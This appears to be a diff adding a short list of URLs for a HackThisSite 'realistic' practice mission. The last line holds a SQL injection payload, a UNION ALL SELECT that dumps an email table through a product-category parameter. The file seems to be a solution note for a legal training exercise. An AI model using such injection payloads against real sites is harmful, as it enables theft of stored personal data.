@@ -1,0 +1,4 @@
+https://www.hackthissite.org/missions/realistic/4/
+https://www.hackthissite.org/missions/realistic/4/products.php?category=1
+https://www.hackthissite.org/missions/realistic/4/products.php?category=2
+https://www.hackthissite.org/missions/realistic/4/products.php?category=2UNION%20ALL%20SELECT%20null,%20*,%20null,%20null%20FROM%20email;
